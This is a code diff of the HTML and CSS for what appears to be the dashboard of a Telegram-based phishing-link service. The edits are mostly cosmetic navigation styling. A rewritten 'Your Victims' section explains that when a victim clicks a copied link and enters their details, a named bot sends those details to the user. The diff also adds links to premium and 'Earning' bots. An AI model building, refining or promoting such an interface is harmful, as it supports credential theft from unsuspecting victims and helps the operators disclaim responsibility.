@@ -187,20 +187,20 @@
       background: none;
       border: none;
       color: #3d5a72;
-      font-size: 1.2rem;
+      font-size: 1.1rem;
       display: flex;
       flex-direction: column;
       align-items: center;
       cursor: pointer;
       transition: color 0.2s;
-      width: 58px;
+      width: 44px;
     }
     .bottom-nav button span {
-      font-size: 0.65rem;
+      font-size: 0.55rem;
       margin-top: 2px;
       font-weight: 600;
       font-family: 'Share Tech Mono', monospace;
-      letter-spacing: 0.5px;
+      letter-spacing: 0.3px;
       text-transform: uppercase;
     }
     .bottom-nav button.active { color: #38c9ff; }
@@ -395,8 +395,9 @@
     <!-- Victim Section -->
     <section id="victim" class="page" style="text-align:center;">
       <h2>Your Victims</h2>
-      <p>We don't save your Victim logs in our server this bot will send it to you when your Victim login just make sure you open the bot and send /start now.</p>
-      <button id="openBotBtnVictim" class="btn">👉 Open Bot</button>
+      <p>If you copy a link and your Victim clicks on the link and drops their details, <strong style="color:#38c9ff;">@intelligentverificationlinkbot</strong> will send you the details. Your Victim's details are between you and your Victim — this bot doesn't know anything about it.</p>
+      <p style="margin-top:10px;">Then start <strong style="color:#38c9ff;">@intelligentverificationlinkbot</strong> by clicking the button below.</p>
+      <button id="openBotBtnVictim" class="btn">👉 Start @intelligentverificationlinkbot</button>
     </section>
 
     <!-- Donate Section -->
@@ -407,9 +408,15 @@
   </main>
 <nav class="bottom-nav">
   <button onclick="showMyAd(); switchPage('home')" id="navHome" class="active">🏠<span>Home</span></button>
-  <button onclick="switchPage('premium')" id="navPremium">🔒<span>Premium links</span></button>
+  <button onclick="switchPage('premium')" id="navPremium">🔒<span>Premium</span></button>
   <button onclick="showMyAd(); switchPage('victim')" id="navVictim">👁️<span>Victim</span></button>
   <button onclick="switchPage('donate')" id="navDonate">💰<span>Donate</span></button>
+  <a href="https://t.me/intelligentpublicgroupsbot/explore" target="_blank">
+    <button id="navGroups">👥<span>Groups</span></button>
+  </a>
+  <a href="http://t.me/intelpremiumbot/premiumdash" target="_blank">
+    <button id="navEarning">💵<span>Earning</span></button>
+  </a>
   <a href="https://t.me/intelligentverificationlinkbot/about" target="_blank">
     <button id="navHelp">❓<span>Help</span></button>
   </a>
